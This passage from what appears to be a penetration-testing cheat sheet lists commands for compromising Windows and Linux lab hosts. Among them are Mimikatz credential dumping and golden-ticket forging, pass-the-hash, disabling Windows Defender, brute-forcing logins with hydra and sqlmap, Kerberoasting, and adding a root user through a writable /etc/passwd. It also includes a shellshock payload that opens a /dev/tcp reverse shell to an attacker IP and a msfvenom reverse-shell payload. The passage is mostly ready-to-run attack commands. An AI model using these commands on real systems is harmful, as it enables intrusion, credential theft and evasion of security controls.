class="hljs-built_in">echo</span> ((<span class="hljs-built_in">new-object</span> Net.Sockets.TcpClient).Connect(<span class="hljs-variable">$ip</span>,<span class="hljs-variable">$_</span>)) <span class="hljs-string">&quot;Port <span class="hljs-variable">$_</span> is open on <span class="hljs-variable">$ip</span>&quot;</span>&#125; <span class="hljs-number">2</span>&gt;<span class="hljs-variable">$null</span><br></code></pre></div></td></tr></table></figure><p>Find Keyword</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> C:\www <span class="hljs-literal">-Include</span> *.txt,*.xml,*.config,*.conf,*.cfg,*.ini <span class="hljs-operator">-File</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue | <span class="hljs-built_in">Select-String</span> <span class="hljs-literal">-Pattern</span> <span class="hljs-string">&quot;password&quot;</span><br></code></pre></div></td></tr></table></figure><p>Disable/Enable Windows Defender</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># Disable</span><br><span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRealtimeMonitoring</span> <span class="hljs-variable">$true</span><br><br><span class="hljs-comment"># Enable</span><br><span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRealtimeMonitoring</span> <span class="hljs-variable">$false</span><br></code></pre></div></td></tr></table></figure><br/><h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><ul><li>Port Scan<ul><li>Nmap</li><li>Masscan</li></ul></li><li>Mimikatz</li><li>PsExec</li><li>JuicyPotato</li><li>SMB<ul><li>psexec.py</li><li>wmiexec.py</li><li>smbclient</li></ul></li><li>Password<ul><li>hashcat</li><li>cewl</li><li>hydra</li></ul></li><li>MSF<ul><li>msfconsole</li></ul></li><li>Hash</li><li>Web<ul><li>Scan</li><li>Dir Enum</li><li>Password Attack</li><li>SQL Injection</li></ul></li><li>Ldap</li></ul><br/><h3 id="Port-Scan"><a href="#Port-Scan" class="headerlink" title="Port Scan"></a>Port Scan</h3><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nmap -sU -sV --top-ports 100 -oA nmap/top_100_udp 10.11.1.44<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">proxychains4 nmap -Pn -sT -sC -sV -oA nmap/full 10.1.xx.x<br></code></pre></div></td></tr></table></figure><h4 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">masscan -p1-65535,U:1-65535 10.11.1.111 --rate=1000 -e tun0 &gt; ports<br></code></pre></div></td></tr></table></figure><br/><h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># system priv</span><br>mimikatz.exe <span class="hljs-string">&quot;lsadump::sam&quot;</span> <span class="hljs-keyword">exit</span><br><br>mimikatz.exe <span class="hljs-string">&quot;lsadump::secrets&quot;</span> <span class="hljs-keyword">exit</span><br><br>mimikatz.exe <span class="hljs-string">&quot;kerberos::list /export&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-keyword">exit</span><br><br><span class="hljs-comment"># history0 is a last change passwd</span><br>mimikatz.exe <span class="hljs-string">&quot;lsadump::setntml /user:USER /ntml:NTML&quot;</span> <span class="hljs-keyword">exit</span><br><br><span class="hljs-comment"># MsCacheV2</span><br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;lsadump::cache&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><br><span class="hljs-comment"># log</span><br>mimikatz.exe <span class="hljs-string">&quot;log&quot;</span> <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;lsadump::dcsync /user:Krbtgt&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;sekurlsa::msv&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><br><span class="hljs-comment"># cmdkey</span><br>mimikatz.exe <span class="hljs-string">&quot;vault::cred&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><br><span class="hljs-comment"># pth</span><br>mimikatz.exe <span class="hljs-string">&quot;sekurlsa::pth /user:alice /domain:SVCORP.COM /ntlm:xxx04xx6B8F7B2A3B6C47780xxxxxxxx /run:C:\Windows\System32\spool\drivers\color\re9.exe&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><br>mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /user:evil /domain:corp.com /sid:S-1-5-21-x-x-x /rc4:7xxx5 /ptt&quot;</span><br>mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /user:evil /domain:corp.com /sid:S-1-5-21-x-x-x /target:xxx.corp.com /service:HOST /krbtgt:7xxx5 /ptt&quot;</span><br>mimikatz.exe <span class="hljs-string">&quot;misc::cmd&quot;</span><br></code></pre></div></td></tr></table></figure><br/><h3 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h3><p>local cmd</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">PsExec64<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">i</span> -u awsl -<span class="hljs-selector-tag">p</span> callme1234 C:\Windows\System32\cmd.exe<br></code></pre></div></td></tr></table></figure><br/><h3 id="JuicyPotato"><a href="#JuicyPotato" class="headerlink" title="JuicyPotato"></a>JuicyPotato</h3><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># JuicyPotato reverse shell</span><br><span class="hljs-comment"># msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=4445 -f exe -o re.exe</span><br><span class="hljs-comment"># CLSID : https://ohpe.it/juicy-potato/CLSID/</span><br>cmd /c <span class="hljs-string">&#x27;JuicyPotato.exe -l 1234 -p re.exe -t * -c &#123;8BC3F05E-D86B-11D0-A075-00C04FB68820&#125;&#x27;</span><br></code></pre></div></td></tr></table></figure><br/><h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>psexec</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">psexec.py -hashes :700a8c186d267b607559db7xxxxxxxxxx Administrator@10.11.1.13<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">wmiexec.py -hashes :700a8c186d267b607559db7xxxxxxxxxx Administrator@10.11.1.13<br></code></pre></div></td></tr></table></figure><p>crackmapexec</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">crackmapexec smb 10.11.x.x -u Administrator -H xxxxxxxxxxHash<br><br>crackmapexec smb 10.11.x.x -u USER.list -p PASSWD.list<br></code></pre></div></td></tr></table></figure><p>smbclient</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">smbclient ////10.11.1.13//share<br>smbclient //10.11.1.13/share<br>smbclient -L 10.11.1.231<br>smbclient //share/home -I 192.10.2.11 -N<br></code></pre></div></td></tr></table></figure><br/><h3 id="Password"><a href="#Password" class="headerlink" title="Password"></a>Password</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hashcat --force --stdout -a 6 year.pass ?d?d?d?d?s &gt; result.pass<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">proxychains cewl -m 3 -a --with-numbers http://10.11.1.x -w cewl.txt<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hydra -I -l root@localhost -P cewl.txt 10.11.1.xx http-post-form <span class="hljs-string">&quot;/otrs/index.pl:Action=Login&amp;RequestedURL=&amp;Lang=en&amp;TimeOffset=240&amp;User=^USER^&amp;Password=^PASS^:F=Login failed&quot;</span><br></code></pre></div></td></tr></table></figure><br/><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><h4 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">portfwd add -l 8888 -p 445 -r 10.11.1.14<br>portfwd add -l 445 -p 445 -r 10.11.1.14<br><br><span class="hljs-comment"># msf portfwd</span><br><span class="hljs-comment"># [*] Local TCP relay created: :8888 &lt;-&gt; 10.11.1.14:445</span><br><span class="hljs-comment"># localhost:8888 --&gt; 10.11.1.14:445</span><br></code></pre></div></td></tr></table></figure><p>Suggester</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use post/multi/recon/local_exploit_suggester<br></code></pre></div></td></tr></table></figure><p>UAC</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use exploit/windows/<span class="hljs-built_in">local</span>/bypassuac_sdclt<br>getsystem<br></code></pre></div></td></tr></table></figure><p>Kiwi</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 注意引号</span><br>kiwi_cmd <span class="hljs-string">&#x27;&quot;sekurlsa::tickets /export&quot;&#x27;</span><br></code></pre></div></td></tr></table></figure><p>Search</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">search handler <span class="hljs-built_in">type</span>:exploit<br>search cve:2007-2446<br></code></pre></div></td></tr></table></figure><p>Upload File</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">upload /tmp/callme.vbs C:\callme.vbs<br></code></pre></div></td></tr></table></figure><p>Route</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">meterpreter &gt; run get_local_subnets<br><span class="hljs-comment"># Local subnet: 10.12.1.0/255.255.255.0</span><br><br>meterpreter &gt; run autoroute -s 10.12.1.0/255.255.255.0<br><br>meterpreter &gt; run autoroute -p<br></code></pre></div></td></tr></table></figure><h4 id="Modules"><a href="#Modules" class="headerlink" title="Modules"></a>Modules</h4><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-variable">$HOME</span><span class="hljs-regexp">/.msf4/m</span>odules<br></code></pre></div></td></tr></table></figure><p>searchsploit 45269</p><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">PATH<br>-----------------------<br>windows/local/45269.rb<br></code></pre></div></td></tr></table></figure><p>copy to modules</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">mkdir -p <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/.msf4/m</span>odules<span class="hljs-regexp">/windows/</span>local<br><br>searchsploit -m windows<span class="hljs-regexp">/local/</span><span class="hljs-number">45269</span>.rb<br></code></pre></div></td></tr></table></figure><br/><h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><p>Extracting hash from SAM(local)</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">reg save hklm\sam C:\SAM<br>reg save hklm\system C:\SYSTEM<br>reg save hklm\security C:\SECURITY<br><br>impacket<span class="hljs-literal">-secretsdump</span> <span class="hljs-literal">-system</span> system <span class="hljs-literal">-sam</span> sam <span class="hljs-literal">-security</span> security LOCAL<br></code></pre></div></td></tr></table></figure><p>List history passwd</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># List history passwd</span><br>secretsdump.py -just-dc -<span class="hljs-built_in">history</span> -hashes LM:NTLM Administrator@10.11.x.x<br></code></pre></div></td></tr></table></figure><br/><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nikto -host http://10.11.1.39 -o nikto.json -Format json -Display P<br>nikto -host http://10.11.1.39 -Plugins robots<br><br><span class="hljs-comment"># dir_traversal,clientaccesspolicy,msgs,shellshock,robots,</span><br><span class="hljs-comment"># content_search,httpoptions,put_del_test,sitefiles,strutshock</span><br></code></pre></div></td></tr></table></figure><h4 id="Dir-Enum"><a href="#Dir-Enum" class="headerlink" title="Dir Enum"></a>Dir Enum</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ffuf -c -t 30 -<span class="hljs-built_in">fc</span> 403 -w wordlists:DIR -w extensions:EX -u https://127.0.0.1/DIR.EX -o out<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># Wordlists -&gt; /uar/share/seclists/fuzz/*</span><br>wfuzz -c -u http://10.10.10.79/api/get -w /path/to/wordlists -d <span class="hljs-string">&#x27;&#123;&quot;name&quot;: &quot;FUZZ&quot;&#125;&#x27;</span><br><br><span class="hljs-comment"># Proxy -&gt; burp</span><br>wfuzz -c -u http://10.10.10.79/api/get -w /path/to/wordlists -d <span class="hljs-string">&#x27;&#123;&quot;name&quot;: &quot;FUZZ&quot;&#125;&#x27;</span> -p 127.0.0.1:8080:HTTP<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">feroxbuster --depth 2 -u http://10.11.1.xx/php/ -x php,txt,conf,cgi -t 50<br></code></pre></div></td></tr></table></figure><h4 id="Password-Attack"><a href="#Password-Attack" class="headerlink" title="Password Attack"></a>Password Attack</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hydra -I -l root@localhost -P cewl.txt 10.11.1.xx http-post-form <span class="hljs-string">&quot;/otrs/index.pl:Action=Login&amp;RequestedURL=&amp;Lang=en&amp;TimeOffset=240&amp;User=^USER^&amp;Password=^PASS^:F=Login failed&quot;</span><br></code></pre></div></td></tr></table></figure><h4 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sqlmap -u http://10.11.1.x/login-off.asp --data=<span class="hljs-string">&#x27;txtLoginID=admin&amp;txtPassword=admin&amp;cmdSubmit=Login&#x27;</span> --skip=<span class="hljs-string">&#x27;cmdSubmit&#x27;</span> --dbms=<span class="hljs-string">&#x27;Microsoft SQL Server&#x27;</span> --random-agent<br></code></pre></div></td></tr></table></figure><br/><h3 id="Ldap"><a href="#Ldap" class="headerlink" title="Ldap"></a>Ldap</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ldapsearch -LLL -x -H ldap://sv-dc01.svcorp.com -b <span class="hljs-string">&#x27;&#x27;</span> -s base <span class="hljs-string">&#x27;(objectclass=*)&#x27;</span><br></code></pre></div></td></tr></table></figure><br/><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><ul><li>pseudo-terminal</li><li>searchsploit</li><li>shellshock attack</li><li><code>/etc/passwd</code> is writable</li><li>powershell run .ps1 Script</li><li>NFS easy exploit</li><li>if missing ticket</li><li>Kerberoasting</li><li>Crack MsCacheV2(DCC2)</li><li>Unquoted Search Path</li><li>group in docker</li></ul><br/><p>pseudo-terminal</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># start up</span><br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="hljs-built_in">export</span> SHELL=/bin/bash <br><span class="hljs-built_in">alias</span> ls=<span class="hljs-string">&#x27;ls --color=auto&#x27;</span> <br><span class="hljs-built_in">alias</span> ll=<span class="hljs-string">&#x27;ls -alh --color=auto&#x27;</span><br><span class="hljs-built_in">alias</span> grep=<span class="hljs-string">&#x27;grep --color=auto&#x27;</span><br><span class="hljs-built_in">export</span> TERM=xterm-256color<br></code></pre></div></td></tr></table></figure><p>searchsploit</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">searchsploit --id MS17-017<br>searchsploit -m xxx<br>searchsploit --nmap allport.xml<br></code></pre></div></td></tr></table></figure><p>shellshock attack</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">Cookie:  () &#123; :;&#125;; /bin/bash -c <span class="hljs-string">&#x27;whoami; id; ifconfig&#x27;</span><br>Cookie:  () &#123; :;&#125;; /bin/bash -c <span class="hljs-string">&#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.119.167/4444 &lt;&amp;1&#x27;</span><br></code></pre></div></td></tr></table></figure><p><code>/etc/passwd</code> is writable</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">openssl passwd callme<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;evil:NIk9BGd8Qt8dI:0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; /etc/passwd<br><br>su evil<br></code></pre></div></td></tr></table></figure><p>powershell 运行 .ps1 脚本</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-ep</span> Bypass slui_bypass_uac.ps1<br>powershell <span class="hljs-literal">-Exec</span> Bypass slui_bypass_uac.ps1<br></code></pre></div></td></tr></table></figure><p>NFS easy exploit</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">showmount -e 10.11.1.xx<br><span class="hljs-comment"># vers=3 display UID PID</span><br>mount -t nfs -o vers=3 10.11.1.x:/home /tmp/home<br><br><span class="hljs-comment"># Permission denied</span><br>useradd <span class="hljs-built_in">test</span> <br><span class="hljs-comment"># change UID GID /etc/passwd</span><br><br><span class="hljs-comment"># if share /home</span><br>mkdir .ssh <br>ssh-keygen -f target<br>cat target.pub &gt; authorized_keys<br>cp authorized_keys /tmp/home/USER/.ssh/<br><br>ssh USER@10.11.1.x -i target<br></code></pre></div></td></tr></table></figure><p>if missing ticket</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># missing ticket</span><br><span class="hljs-built_in">Invoke-Kerberoast</span>.ps1<br><span class="hljs-comment"># or</span><br><span class="hljs-built_in">Get-SPN</span>.ps1<br></code></pre></div></td></tr></table></figure><p>Kerberoasting / John / Hashcat</p><ul><li><p>mimikatz.exe</p></li><li><p>Powershell-Empire -&gt; Invoke-kerberoast</p></li><li><p>kirbi2hashcat.py -&gt; Is Output John format</p></li><li><p>kirbi2john.py</p></li><li><p><a href="https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/">How to: Kerberoast like a boss</a></p></li></ul><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">mimikatz.exe <span class="hljs-string">&quot;kerberos::list /export&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><br><span class="hljs-comment"># Convert *.kirbi to john</span><br>python /opt/kirbi2hashcat/kirbi2hashcat.py *.kirbi &gt; hashcat/allhash.txt<br>python /usr/share/john/kirbi2john.py *.kirbi &gt; john/alljohn.txt<br><span class="hljs-comment"># $krb5tgs$18$...</span><br><br>john -<span class="hljs-literal">-format</span>=krb5tgs hashcat/allhash.txt <span class="hljs-literal">-w</span>=/usr/share/wordlists/rockyou.txt<br><br><br><span class="hljs-comment"># Convert *.kirbi to hashcat</span><br>Powershell<span class="hljs-literal">-Empire</span> - <span class="hljs-built_in">Invoke-kerberoast</span> - Hashcat format<br><span class="hljs-comment"># or Invoke-Kerberoast.ps1</span><br><span class="hljs-built_in">Import-Module</span> <span class="hljs-built_in">Invoke-Kerberoast</span>.ps1<br><span class="hljs-built_in">Invoke-Kerberoast</span> <span class="hljs-literal">-Domain</span> xor.com <span class="hljs-literal">-OutputFormat</span> HashCat | <span class="hljs-built_in">Select-Object</span> <span class="hljs-literal">-ExpandProperty</span> hash | <span class="hljs-built_in">out-file</span> <span class="hljs-literal">-Encoding</span> ASCII kerb<span class="hljs-literal">-Hash0</span>.txt<br><span class="hljs-comment"># $krb5tgs$23$ ...</span><br><br>hashcat <span class="hljs-literal">-m</span> <span class="hljs-number">13100</span> hashs/allhash.txt wordlist/rockyou.txt -<span class="hljs-literal">-force</span><br><br><br><span class="hljs-comment"># Use crel</span><br><span class="hljs-variable">$</span> python /opt/impacket/examples/GetUserSPNs.py <span class="hljs-literal">-request</span> xor.com/sqlserver <span class="hljs-literal">-dc</span><span class="hljs-literal">-ip</span> <span class="hljs-number">10.11</span>.<span class="hljs-number">1.120</span><br>Password: xxxx<br><br></code></pre></div></td></tr></table></figure><p>Crack MsCacheV2(DCC2)</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">john --format=mscash2 mscash2.hash -w=/usr/share/wordlists/rockyou.txt<br><span class="hljs-comment"># username:hash</span><br><br>hashcat -m 2100 hashs/mscash2.hash wordlist/rockyou.txt --force<br><span class="hljs-comment"># $DCC2$10240#username#HASH</span><br><span class="hljs-comment"># https://tinyapps.org/docs/domain-cached-credentials.html</span><br></code></pre></div></td></tr></table></figure><p>Unquoted Search Path</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">wmic service get name,displayname,pathname,startmode | 